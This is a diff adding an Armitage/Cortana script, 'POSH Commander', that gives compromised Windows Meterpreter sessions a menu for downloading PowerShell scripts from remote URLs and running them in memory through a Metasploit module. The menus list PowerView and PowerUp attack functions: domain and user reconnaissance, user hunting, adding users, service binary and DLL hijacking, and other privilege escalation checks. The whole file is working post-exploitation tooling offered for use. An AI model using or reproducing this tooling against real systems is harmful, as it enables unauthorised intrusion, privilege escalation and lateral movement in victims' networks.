@@ -1,0 +1,190 @@
+# POSH Commander
+#
+# This Cortana script works with a Metasploit module to allow you to utilize Powershell's Invoke Expression (IEX) 
+# and .Net functionalities to download and run a script in memory on your target Windows host. Once a compromised Windows host
+# is activated in Armitage/Cortana, a menu is presented upon right-click of the host. 
+#
+# Prerequisite: Place the remote_powershell.rb Metasploit module in your "metasploit-framework/modules/post/windows/manage/" directory.
+#
+# Created by: rvrsh3ll
+#
+# Veil Project: https://github.com/Veil-Framework/
+# PowerView and PowerUp blog by harmj0y: http://blog.harmj0y.net/
+#
+#
+on session_sync {
+
+	local('$sid');
+	
+	if (-iswinmeterpreter $1) {
+		popup meterpreter_bottom {
+			menu "Posh Commander" {
+				item "Veil-PowerView" {
+					spawn(&veilPowerView, $sid => $1);
+				}
+				item "Veil-PowerUp" {
+					spawn(&veilPowerUp, $sid => $1);
+				}
+				item "Custom Script" {
+					spawn(&customScript, $sid => $1);
+				}
+				
+			}
+		}
+	}		
+}
+
+sub veilPowerView {
+		
+		global('$console @commands $args $setargs $argsprompt $command $scriptUrl');
+		$console = console();
+		$console = open_console_tab("meterpreter $sid");
+		$scriptUrl = prompt_text("URL to the PowerView script", "http://bit.ly/1mYPUO4");
+		
+		
+		@commands = @(
+			%(commands => "Get-ShuffledArray"),
+			%(commands => "Get-HostIP"),
+			%(commands => "Test-Server"),
+			%(commands => "Get-NetDomain"),
+			%(commands => "Get-NetDomainControllers"),
+			%(commands => "Get-NetCurrentUser"),
+			%(commands => "Get-NetUsers"),
+			%(commands => "Get-NetUser"),
+			%(commands => "Invoke-NetUserAdd"),
+			%(commands => "Get-NetComputers"),
+			%(commands => "Get-NetGroups"),
+			%(commands => "Get-NetGroup"),
+			%(commands => "Invoke-NetGroupUserAdd"),
+			%(commands => "Get-NetFileServers"),
+			%(commands => "Get-NetShare"),
+			%(commands => "Get-NetLoggedon"),
+			%(commands => "Get-NetConnections"),
+			%(commands => "Get-NetSessions"),
+			%(commands => "Get-NetFiles"),
+			%(commands => "Get-UserProperties"),
+			%(commands => "Invoke-CheckLocalAdminAccess"),
+			%(commands => "Invoke-Netview"),
+			%(commands => "Invoke-UserHunter"),
+			%(commands => "Invoke-StealthUserHunter"),
+			%(commands => "Invoke-ShareFinder"),
+			%(commands => "Invoke-FindLocalAdminAccess"),
+			%(commands => "Invoke-UserDescSearch"),
+			%(commands => "Invoke-FindVulnSystems")
+			);
+		
+		# open table to select a command to send
+		prompt_list("Veil-PowerView Commands", @("Run", "Cancel"), @('commands'), @commands, $null, 500, 700);
+		
+	on item_selected {
+			
+	
+		if ($1 eq "Run") {
+		
+			$argsprompt = prompt_confirm("Would you like to add arguments to this command?", "Yes", "No");
+				if ($argsprompt eq "0") {
+					$setargs = prompt_text("Enter your additional arguments");
+					$args = "$setargs";
+					$command = "$2 $args";
+				}
+								
+				else if ($argsprompt eq "1") {
+						$args = $null;
+						$command = "$2";
+				}
+				
+					else if ($1 eq "Cancel") {
+								return;
+					}
+								
+				sendCommand();				
+					
+					on tab_close {
+							quit();
+					}
+		}	
+	}
+}
+
+sub veilPowerUp {
+		
+		global('$console @commands $args $setargs $argsprompt $command $vpvuri $scriptUrl');
+		$console = console();
+		$console = open_console_tab("meterpreter $sid");
+		$scriptUrl = prompt_text("URL to the PowerUp script", "http://bit.ly/1mK64oH");
+		
+				
+		
+		@commands = @(
+			%(commands => "Get-ServiceUnquoted"),
+			%(commands => "Get-ServiceEXEPerms"),
+			%(commands => "Get-ServicePerms"),
+			%(commands => "Invoke-ServiceUserAdd"),
+			%(commands => "Write-UserAddServiceBinary"),
+			%(commands => "Write-UserAddMSI"),
+			%(commands => "Write-ServiceEXE"),
+			%(commands => "Restore-ServiceEXE"),
+			%(commands => "Invoke-ServiceStart"),
+			%(commands => "Invoke-ServiceStop"),
+			%(commands => "Invoke-ServiceEnable"),
+			%(commands => "Invoke-ServiceDisable"),
+			%(commands => "Get-ServiceDetails"),
+			%(commands => "Invoke-FindDLLHijack"),
+			%(commands => "Invoke-FindPathDLLHijack"),
+			%(commands => "Get-RegAlwaysInstallElevated"),
+			%(commands => "Get-RegAutoLogon"),
+			%(commands => "Get-UnattendedInstallFiles"),
+			%(commands => "Invoke-AllChecks")
+			);
+		
+		prompt_list("Veil-PowerUp Commands", @("Run", "Cancel"), @('commands'), @commands, $null, 500, 700);
+		
+	on item_selected {
+			
+	
+		if ($1 eq "Run") {
+		
+			$argsprompt = prompt_confirm("Would you like to add arguments to this command?", "Yes", "No");
+				if ($argsprompt eq "0") {
+					$setargs = prompt_text("Enter your additional arguments");
+					$args = "$setargs";
+					$command = "$2 $args";
+				}
+				
+				else if ($argsprompt eq "1") {
+						$args = $null;
+						$command = "$2";
+				}
+											
+					else if ($1 eq "Cancel") {
+								return;
+					}
+								
+				sendCommand();				
+					
+						on tab_close {
+									quit();
+						}
+		}	
+	}
+}
+
+sub customScript {
+	global('$command $scriptUrl');
+	$scriptUrl = prompt_text("URL to your script");
+	$command = prompt_text("Script command + arguments");
+	sendCommand();
+
+}
+
+sub sendCommand {
+		cmd($console, "use windows/manage/powershell/remote_powershell");
+		cmd_set($console, %(
+							SESSION => "$sid",
+							SCRIPT 	=> "$scriptUrl",
+							COMMAND => "$command"
+							));
+		
+		cmd($console, "run -j");
+
+}
